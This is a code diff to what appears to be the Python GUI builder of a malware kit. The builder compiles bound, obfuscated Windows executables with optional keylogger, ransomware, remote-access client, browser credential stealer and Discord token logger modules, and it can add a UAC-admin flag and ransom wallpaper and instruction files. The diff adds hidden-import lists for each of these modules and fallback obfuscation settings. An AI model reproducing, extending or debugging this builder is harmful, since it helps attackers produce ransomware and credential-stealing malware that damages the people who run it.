@@ -4,7 +4,7 @@ from colorama import Style, Fore
 from tkinter import filedialog as fd
 from bit import SUPPORTED_CURRENCIES
 from cryptography.fernet import Fernet
-import customtkinter, subprocess, websocket, threading, coincurve, requests, tkinter, shutil, base64, fade, time, os
+import customtkinter, subprocess, Cryptodome, websocket, threading, coincurve, requests, tkinter, shutil, base64, fade, time, os
 
 customtkinter.set_appearance_mode("dark")
 
@@ -349,8 +349,12 @@ class App(customtkinter.CTk):
 
         binder_files = binder_widgets['Add File'].filenames
 
-        self.base = int(misc_config['Base (2 - 55000)'].get())
-        self.recursion = int(misc_config['Obfuscation (1 - 5)'].get())
+        try:
+            self.base = int(misc_config['Base (2 - 55000)'].get())
+            self.recursion = int(misc_config['Obfuscation (1 - 5)'].get())
+        except ValueError:
+            self.base = 55000
+            self.recursion = 2
 
         self.response_label.configure(text='Compiling To Exe...')
 
@@ -439,7 +443,81 @@ class App(customtkinter.CTk):
             shutil.copyfile(cast_file, f'{dir}\\src\\temp\\cast_{filename}')
 
         coincurve_path = "\\".join(coincurve.__file__.split("\\")[:-1])
-        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--windowed', '--onefile', '--icon', icon if icon else 'NOICON', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{coincurve_path};coincurve', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.', '--add-data' if cast_file else '', f'{dir}\\src\\temp\\cast_{filename};.' if cast_file else ''] + binder_args + ['--clean', f'{dir}\\src\\output.py']
+        cryptodome_path = "\\".join(Cryptodome.__file__.split("\\")[:-1])
+
+        default_imports = [
+            '--hidden-import','subprocess',
+            '--hidden-import','win32file',
+            '--hidden-import','pythoncom',
+            '--hidden-import','threading',
+            '--hidden-import','requests',
+            '--hidden-import','winsound', 
+            '--hidden-import','win32api',
+            '--hidden-import','win32gui', 
+            '--hidden-import','win32con',
+            '--hidden-import','win32ui', 
+            '--hidden-import','sqlite3',
+            '--hidden-import','random',  
+            '--hidden-import','winreg',
+            '--hidden-import','base64',
+            '--hidden-import','psutil', 
+            '--hidden-import','shutil',
+            '--hidden-import','string',
+            '--hidden-import','msvcrt', 
+            '--hidden-import','ctypes',
+            '--hidden-import','scipy',
+            '--hidden-import','shlex',
+            '--hidden-import','time',
+            '--hidden-import','json',
+            '--hidden-import','uuid',
+            '--hidden-import','math',
+            '--hidden-import','mss',
+            '--hidden-import','sys',
+            '--hidden-import','cv2',
+            '--hidden-import','wmi',
+            '--hidden-import','ssl',
+            '--hidden-import','re',
+            '--hidden-import','io',
+            '--hidden-import','os',
+        ]
+
+        keylogger_imports = [
+            '--hidden-import', 'keyboard', 
+            '--hidden-import', 'tkinter'
+        ] if keylogger else []
+
+        ransomware_imports = [
+            '--hidden-import', 'cryptography.fernet',
+            '--hidden-import', 'Cryptodome.Cipher.AES',
+            '--hidden-import', 'tkinter', 
+            '--hidden-import', 'bit', 
+            
+        ] if ransomware else []
+
+        server_imports = [
+            '--hidden-import', 'discord_webhook', 
+            '--hidden-import', 'websocket', 
+            '--hidden-import', 'discord',
+            '--hidden-import', 'pyaudio'
+        ] if rat_client else []
+
+        browser_imports = [
+            '--hidden-import', 'Cryptodome.Cipher.AES',
+            '--hidden-import', 'discord_webhook', 
+            '--hidden-import', 'win32crypt', 
+            '--hidden-import', 'sqlite3', 
+            '--hidden-import', 'zipfile',
+            '--hidden-import', 'discord'
+        ] if browser else []
+
+        discord_imports = [
+            '--hidden-import', 'discord_webhook', 
+            '--hidden-import', 'discord'
+        ] if token_logger else []
+
+        imports = default_imports + keylogger_imports + ransomware_imports + server_imports + browser_imports + discord_imports
+
+        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--windowed', '--onefile', '--clean'] + imports + ['--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{coincurve_path};coincurve', '--add-data', f'{cryptodome_path};Cryptodome', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.', '--add-data' if cast_file else '', f'{dir}\\src\\temp\\cast_{filename};.' if cast_file else ''] + binder_args + [f'{dir}\\src\\output.py']
         for _ in range(command.count('')):
             command.remove('')
         print(command)
